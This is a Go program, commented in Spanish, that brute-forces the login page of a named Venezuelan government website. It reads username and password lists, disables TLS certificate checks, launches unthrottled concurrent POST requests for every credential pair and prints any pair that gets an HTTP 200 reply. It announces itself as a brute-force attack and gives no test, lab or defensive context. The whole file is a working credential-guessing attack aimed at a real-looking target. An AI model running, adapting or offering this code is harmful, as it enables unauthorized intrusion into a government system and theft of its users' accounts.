package main

import (
	"bufio"
	"bytes"
	"crypto/tls"
	"fmt"
	"net/http"
	"os"
	"sync"
	"time"
)

const (
	url          = "https://gobernacion.falcon.gob.ve/login" // URL de inicio de sesión del sitio web objetivo
	usernameFile = "username.txt"                            // Archivo que contiene los nombres de usuario
	passwordFile = "password.txt"                            // Archivo que contiene las contraseñas
)

func main() {
	usernames, err := readLines(usernameFile)
	if err != nil {
		fmt.Println("Error leyendo el archivo de nombres de usuario:", err)
		return
	}

	passwords, err := readLines(passwordFile)
	if err != nil {
		fmt.Println("Error leyendo el archivo de contraseñas:", err)
		return
	}

	var wg sync.WaitGroup
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
	}
	client := &http.Client{Transport: tr, Timeout: 10 * time.Second}

	for _, username := range usernames {
		for _, password := range passwords {
			wg.Add(1)
			go func(username, password string) {
				defer wg.Done()
				if attemptLogin(client, url, username, password) {
					fmt.Printf("Credenciales encontradas - Usuario: %s, Contraseña: %s\n", username, password)
				}
			}(username, password)
		}
	}

	wg.Wait()
	fmt.Println("Ataque de fuerza bruta terminado.")
}

func readLines(filename string) ([]string, error) {
	var lines []string
	file, err := os.Open(filename)
	if err != nil {
		return nil, err
	}
	defer file.Close()

	scanner := bufio.NewScanner(file)
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}

	if err := scanner.Err(); err != nil {
		return nil, err
	}
	return lines, nil
}

func attemptLogin(client *http.Client, url, username, password string) bool {
	// Construir el cuerpo de la solicitud POST en formato form-data
	form := fmt.Sprintf("username=%s&password=%s", username, password)
	req, err := http.NewRequest("POST", url, bytes.NewBuffer([]byte(form)))
	if err != nil {
		fmt.Println("Error creando la solicitud:", err)
		return false
	}

	req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
	resp, err := client.Do(req)
	if err != nil {
		fmt.Println("Error realizando la solicitud:", err)
		return false
	}
	defer resp.Body.Close()

	return resp.StatusCode == http.StatusOK
}
